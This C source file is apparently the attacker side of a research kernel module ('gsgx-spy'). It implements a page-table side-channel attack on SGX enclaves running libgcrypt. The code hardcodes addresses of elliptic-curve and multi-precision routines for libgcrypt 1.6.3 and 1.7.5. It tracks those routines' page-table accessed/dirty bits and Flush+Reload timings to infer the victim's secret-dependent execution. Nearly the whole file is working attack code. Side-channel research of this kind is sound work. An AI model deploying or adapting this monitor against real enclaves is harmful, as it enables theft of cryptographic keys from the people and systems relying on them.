#include "gsgx_attacker_internal.h"
#include "gsgx_attacker_pte_set.h"
#include <linux/slab.h>

spy_pte_set_t *ad_set = NULL; //XXX

void add_to_pte_set(spy_pte_set_t *set, uint64_t adrs)
{
    if (!set)
        return;
    spy_pte_t *cur, *new;
    uint64_t *pte_pt = (uint64_t*) get_pte_adrs(adrs);
    uint64_t mask = 0xFFFFFFFFFFFFFFC0;
    uint64_t cacheline = (uint64_t) pte_pt & mask;
    
    if (set->restrict_cacheline)
    {
        for (cur = set->head; cur; cur = cur->nxt)
            if (cur->cacheline == cacheline)
            {
                pr_info("gsgx-spy: ^^ ignoring PTE in shared cache line 0x%llx\n",
                    cacheline);
                return;
            }
    }

    new = kmalloc(sizeof(spy_pte_t), GFP_KERNEL);
    RET_WARN_ON(!new || !set,);

    new->pte_pt = pte_pt;
    new->cacheline = cacheline;
    new->nxt = set->head;
    set->head = new;
}

// XXX no ASLR --> hardcode addresses (from objdump application binary)
#if CONFIG_SPY_GCRY && (CONFIG_SPY_GCRY_VERSION == 163)
    #define GCRYLIB_ADRS    (0xb417000)
    #define GPG_ERR_ADRS    (0xae4e000)

    #define SET_ADRS        (GCRYLIB_ADRS + 0xa7780) // _gcry_mpi_set
    #define TST_ADRS        (GCRYLIB_ADRS + 0xa0a00) // _gcry_mpi_test_bit
    #define MULP_ADRS       (GCRYLIB_ADRS + 0xa97c0) // _gcry_mpi_ec_mul_point
    #define TDIV_ADRS       (GCRYLIB_ADRS + 0xa1310) // _gcry_mpi_tdiv_qr
    #define ERR_ADRS        (GPG_ERR_ADRS + 0x0b6d0) // gpg_err_set_errno
    #define FREE_ADRS       (GCRYLIB_ADRS + 0x0ce90) // _gcry_free
    #define PFREE_ADRS      (GCRYLIB_ADRS + 0x110a0) // _gcry_private_free

    #define XMALLOC_ADRS    (GCRYLIB_ADRS + 0x0d160) // _gcry_xmalloc
    #define MUL_ADRS        (GCRYLIB_ADRS + 0xa6920) // _gcry_mpih_mul
    #define PMALLOC_ADRS    (GCRYLIB_ADRS + 0x10f80) // _gcry_private_malloc

    #define MONITOR_ADRS    SET_ADRS
    #define BASE_ADRS       GCRYLIB_ADRS

    void construct_pte_set(spy_pte_set_t *set)
    {
        pr_info("gsgx-spy: constructing PTE set for gcry v1.6.3\n");
        add_to_pte_set(set, TST_ADRS);
        add_to_pte_set(set, MULP_ADRS);
        add_to_pte_set(set, TDIV_ADRS);
        add_to_pte_set(set, ERR_ADRS);
        add_to_pte_set(set, FREE_ADRS);
        add_to_pte_set(set, PFREE_ADRS);
        
        add_to_pte_set(set, XMALLOC_ADRS);
        add_to_pte_set(set, MUL_ADRS);
        add_to_pte_set(set, PMALLOC_ADRS);
    }

#elif CONFIG_SPY_GCRY && (CONFIG_SPY_GCRY_VERSION == 175)
    #if CONFIG_FLUSH_FLUSH
        #define GCRYLIB_ADRS    (0xb3ea000)
        #define LIBC_ADRS       (0xb039000)
        #define GPG_ERR_ADRS    (0xae21000)

        #define ERRNOLOC_ADRS   (LIBC_ADRS + 0x20590)    // __errno_location
        #define MULP_ADRS       (GCRYLIB_ADRS + 0xca220) // _gcry_mpi_ec_mul_point
        #define TST_ADRS        (GCRYLIB_ADRS + 0xc10d0) // _gcry_mpi_test_bit
        #define ADD_ADRS        (GCRYLIB_ADRS + 0xc0a10) // _gcry_mpi_add

        #define _GPGRT_ADRS     (GPG_ERR_ADRS + 0x2bb0)  // _gpgrt_lock_lock
        #define GPGRT_ADRS      (GPG_ERR_ADRS + 0xb750)  // gpgrt_lock_lock
        #define INT_FREE_ADRS   (LIBC_ADRS + 0x7b110)    // _int_free
        #define INT_MALLOC_ADRS (LIBC_ADRS + 0x7bfe0)    // _int_malloc
        #define LIBC_FREE_ADRS  (LIBC_ADRS + 0x7e970)    // __libc_free
        #define PLT_ADRS        (GCRYLIB_ADRS + 0xab30)  // __errno_location@plt
        #define DO_MALLOC_ADRS  (GCRYLIB_ADRS + 0xe380)  // do_malloc
        #define GCRY_FREE_ADRS  (GCRYLIB_ADRS + 0xf390)  // _gcry_free
        #define PRIV_FREE_ADRS  (GCRYLIB_ADRS + 0x13590) // _gcry_private_free
        #define SEC_FREE_ADRS   (GCRYLIB_ADRS + 0x14120) // _gcry_secmem_free
        #define MPI_MUL_ADRS    (GCRYLIB_ADRS + 0xc2cb0) //_gcry_mpi_mul
        #define MPI_MOD_ADRS    (GCRYLIB_ADRS + 0xc3080) //_gcry_mpi_mod
        #define MPI_DIV_ADRS    (GCRYLIB_ADRS + 0xc5ec0) //_gcry_mpih_divrem
        #define MPI_DIVMOD_ADRS (GCRYLIB_ADRS + 0xc6330) //_gcry_mpih_divmod_1
        #define MPI_ALLOC_LIMB  (GCRYLIB_ADRS + 0xc75b0) //_gcry_mpi_alloc_limb_space
        #define ADD_POINTS_ED   (GCRYLIB_ADRS + 0xc8760) //add_points_edwards
        #define MPI_ADD_POINTS  (GCRYLIB_ADRS + 0xc9bc0) //_gcry_mpi_ec_add_points
        #define MPI_ADD_N       (GCRYLIB_ADRS + 0xcb100) //_gcry_mpih_add_n

        #define MONITOR_ADRS    ERRNOLOC_ADRS
        #define BASE_ADRS       GCRYLIB_ADRS

        void construct_pte_set(spy_pte_set_t *set)
        {
            pr_info("gsgx-spy: constructing F+F PTE set for gcry v1.7.5\n");
            add_to_pte_set(set, MULP_ADRS);
            add_to_pte_set(set, TST_ADRS);
            //add_to_pte_set(set, ADD_ADRS);

            add_to_pte_set(set, _GPGRT_ADRS);
            add_to_pte_set(set, GPGRT_ADRS);
            add_to_pte_set(set, INT_FREE_ADRS);
            //add_to_pte_set(set, INT_MALLOC_ADRS);
            //add_to_pte_set(set, LIBC_FREE_ADRS);
            add_to_pte_set(set, PLT_ADRS);
            add_to_pte_set(set, DO_MALLOC_ADRS);
            //add_to_pte_set(set, GCRY_FREE_ADRS);
            //add_to_pte_set(set, PRIV_FREE_ADRS);
            //add_to_pte_set(set, SEC_FREE_ADRS);
            //add_to_pte_set(set, MPI_MUL_ADRS);
            //add_to_pte_set(set, MPI_MOD_ADRS);
            //add_to_pte_set(set, MPI_DIV_ADRS);
            //add_to_pte_set(set, MPI_DIVMOD_ADRS);
            //add_to_pte_set(set, MPI_ALLOC_LIMB);
            //add_to_pte_set(set, ADD_POINTS_ED);
            //add_to_pte_set(set, MPI_ADD_POINTS);
            //add_to_pte_set(set, MPI_ADD_N);

            add_to_pte_set(ad_set, MULP_ADRS);
            add_to_pte_set(ad_set, TST_ADRS);
            add_to_pte_set(ad_set, ADD_ADRS);
        }

    #else /* !CONFIG_FLUSH_FLUSH */
        #define GCRYLIB_ADRS    (0xb3ea000)

        #define TST_ADRS        (GCRYLIB_ADRS + 0xc10d0) // _gcry_mpi_test_bit
        #define ADDP_ADRS       (GCRYLIB_ADRS + 0xc9bc0) // _gcry_mpi_ec_add_p
        #define MULP_ADRS       (GCRYLIB_ADRS + 0xca220) // _gcry_mpi_ec_mul_p

        #define FREE_ADRS       (GCRYLIB_ADRS + 0x0f390) // _gcry_free
        #define ADD_ADRS        (GCRYLIB_ADRS + 0xc0a10) // _gcry_mpi_add

        #define MONITOR_ADRS    TST_ADRS
        #define BASE_ADRS       GCRYLIB_ADRS

        void construct_pte_set(spy_pte_set_t *set)
        {
            pr_info("gsgx-spy: constructing A/D PTE set for gcry v1.7.5\n");
            add_to_pte_set(set, ADDP_ADRS);
            add_to_pte_set(set, MULP_ADRS);

            add_to_pte_set(set, FREE_ADRS);
            add_to_pte_set(set, ADD_ADRS);
        }
    #endif /* CONFIG_FLUSH_FLUSH */

#elif CONFIG_SPY_MICRO
    #define MONITOR_ADRS    0x807000    // a
    #define BASE_ADRS       0x403017    // asm_microbenchmark_slide

    void construct_pte_set(spy_pte_set_t *set)
    {
        pr_info("gsgx-spy: constructing PTE set for microbenchmark\n");
    }
#else
    #error select spy version in gsgx_attacker_config.h
#endif

spy_pte_set_t *create_pte_set(int restrict_cacheline)
{
    spy_pte_set_t *rv = kmalloc(sizeof(spy_pte_set_t), GFP_KERNEL);
    RET_WARN_ON(!rv, NULL);

    rv->monitor_pte_pt = (uint64_t*) get_pte_adrs(MONITOR_ADRS);
    rv->erip_base = BASE_ADRS;
    rv->head = NULL;
    rv->restrict_cacheline = restrict_cacheline;
    return rv;
}

spy_pte_set_t *build_pte_set(void)
{
    spy_pte_set_t * rv = create_pte_set(CONFIG_FLUSH_RELOAD);
    //ad_set = create_pte_set(0);

    construct_pte_set(rv);
    return rv;
}

uint64_t do_test_pte_set(spy_pte_set_t *set, int fr)
{
    uint64_t rv = 0x0;
    int i = 0;
    unsigned long tsc = 0;
    int accessed = 0;
    spy_pte_t *cur;
    RET_WARN_ON(!set, rv);

    for (i = 0, cur = set->head; cur; i++, cur = cur->nxt)
    {
        if (fr)
        {
            tsc = gsgx_reload(cur->pte_pt); 
            accessed = (tsc < CONFIG_RELOAD_THRESHOLD);
            if (ACCESSED(cur->pte_pt) && !accessed)
            {
                pr_warn("F+R false negative: A=%d; tsc=%lu\n",
                    ACCESSED(cur->pte_pt), tsc);
            }
        }
        else
        {
            accessed = ACCESSED(cur->pte_pt); 
        }
        rv |= accessed << i;
    }

    return rv;
}

void clear_pte_set(spy_pte_set_t *set)
{
    spy_pte_t *cur;
    RET_WARN_ON(!set,);

    for (cur = set->head; cur; cur = cur->nxt)
    {
        CLEAR_AD(cur->pte_pt);
        gsgx_flush(cur->pte_pt);
        WARN_ON( ACCESSED(cur->pte_pt) );
    }
    CLEAR_AD(set->monitor_pte_pt);
    gsgx_flush(set->monitor_pte_pt);
}

uint64_t test_pte_set(spy_pte_set_t *set)
{
    uint64_t ad, rv = do_test_pte_set(set, CONFIG_FLUSH_RELOAD);
    //TODO kick out the hacky A/D reference set when everything works...
    if (ad_set)
    {
        ad = do_test_pte_set(ad_set, 0);
        trace_printk("A/D set 0x%llx\n", ad);
        clear_pte_set(ad_set);
    }

    return rv; 
}

void do_free_pte_set(spy_pte_set_t *set)
{
    spy_pte_t *tmp, *cur;
    if (!set) return;
    
    cur = set->head;    
    while (cur)
    {
        tmp = cur->nxt;
        kfree(cur);
        cur = tmp;
    }
    kfree(set);
}

void free_pte_set(spy_pte_set_t *set)
{
    do_free_pte_set(set);
    do_free_pte_set(ad_set);
    ad_set = NULL;
}
